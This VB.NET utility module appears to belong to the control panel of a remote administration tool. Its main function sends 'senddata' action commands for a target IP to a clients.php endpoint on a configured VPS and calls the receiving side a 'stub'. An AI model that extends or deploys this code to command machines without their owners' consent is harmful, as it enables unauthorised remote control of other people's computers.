Imports System.IO
Imports System.Net
Imports System.Threading

Module Utils
#Region "Random"
    Public Sub ResponsiveSleep(ByRef iMilliSeconds As Integer) ' by user408874 from stackoverflow
        Dim halfSeconds As Integer = iMilliSeconds / 500
        For i = 1 To halfSeconds
            Thread.Sleep(500)
            Application.DoEvents()
        Next
    End Sub

    Public Function RandomString(length As Integer) As String
        If length > 11 Then Throw New ArgumentException("Argument value bigger than 11", "length")
        Return Path.GetRandomFileName().Split(".")(0).Substring(0, length)
    End Function
#End Region

#Region "API"
    ''' <summary>
    ''' This functions safely makes a direct `senddata` command query to the API
    ''' </summary>
    Public Function DirectPanelCommand(ByVal targetIP As String,
                                      ByRef mainWebClient As WebClient,
                                      ByVal message As String,
                                      ByVal actionType As String,
                                      ByVal actionContent As String()) As Boolean

        Dim actionContentParsed As String = ""
        Dim contentNum As Integer = 1

        For Each _data In actionContent
            If _data.Contains(" ") Then _data = """" & _data & """"
            If contentNum = 1 Then
                actionContentParsed &= "&actioncontent=" & _data
            Else
                actionContentParsed &= "&actioncontent" & contentNum & "=" & _data
            End If
            contentNum += 1
        Next

        If MsgBox(message, MsgBoxStyle.YesNo) = MsgBoxResult.Yes Then
            For i = 0 To 5 ' TODO: Is it really useful to spam the request to the stub ?
                mainWebClient.DownloadString(
                    My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIP & "&actiontype=" & actionType & actionContentParsed
                )
                Thread.Sleep(50)
            Next
            Return True
        End If

        Return False
    End Function
#End Region
End Module
